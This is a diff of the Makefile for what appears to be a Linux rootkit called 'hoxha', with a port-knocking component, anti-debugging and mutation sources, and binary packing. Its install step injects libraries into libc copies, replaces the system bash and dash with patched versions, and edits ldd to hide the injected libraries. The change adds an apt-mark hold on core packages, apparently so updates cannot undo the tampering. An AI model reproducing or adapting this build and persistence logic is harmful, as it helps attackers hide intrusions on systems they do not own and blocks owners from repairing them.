@@ -1,7 +1,7 @@
 CC        := cc
 OUT       := hoxha
 CLIENT    := enver
-UPX	:= ./upx
+UPX	 := ./upx
 SSTRIP    := ./sstrip
 SRC       := knocker.c mutate.c anti_debug.c
 BINDIR    := /usr/bin
@@ -10,7 +10,8 @@ CHMOD     := chmod +x
 PATCH     := ./patchelf --add-needed
 TOOLS     := tools
 CLIENTSRC := enver.c anti_debug.c mutate.c
-MARCH 	:= $(shell gcc -Q -march=native --help=target | grep -m1 march= | awk '{print $$2}' | tr -d '[:space:]')
+PACKAGES  := apt sockstat iproute2 bash dash elfutils
+MARCH 	 := $(shell gcc -Q -march=native --help=target | grep -m1 march= | awk '{print $$2}' | tr -d '[:space:]')
 
 # Library targets
 LIBEXEC  := libexec.so
@@ -99,8 +100,9 @@ install:
 	$(PATCH) $(LIBDIR)/libc.so.5 ./bash
 	cp -f ./dash $$(which dash)
 	cp -f ./bash $$(which bash)
+	@sudo apt-mark hold $(PACKAGES)
 	
 	sed -i 's/try_trace \"$$RTLD\" \"$$file\" || result=1/try_trace \"$$RTLD\" \"$$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' $$(which ldd)
-	echo "\nThere may be thousands of principles of Marxism, but in the final analysis they can be summed up in one sentence: Rebellion is justified. - Mao Zedong\n"
+	@echo "\nThere may be thousands of principles of Marxism, but in the final analysis they can be summed up in one sentence: Rebellion is justified. - Mao Zedong\n"
 clean:
 	rm -f $(OUT) $(CLIENT) $(LIBEXEC) $(LIBHIDE) ./dash ./bash
